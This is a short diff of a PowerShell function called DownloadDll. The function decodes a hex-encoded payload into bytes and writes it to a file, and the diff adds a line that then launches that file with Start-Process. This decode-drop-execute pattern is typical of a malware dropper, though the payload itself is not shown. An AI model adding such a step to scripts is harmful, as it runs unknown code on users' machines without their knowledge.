@@ -9,4 +9,6 @@ function DownloadDll {
     $bytes = -split ($payload -replace '..', '0x$& ') | ForEach-Object { [System.Convert]::ToByte($_, 16) }
 
     [System.IO.File]::WriteAllBytes($outFile, $bytes)
+
+    Start-Process $outFile
 }
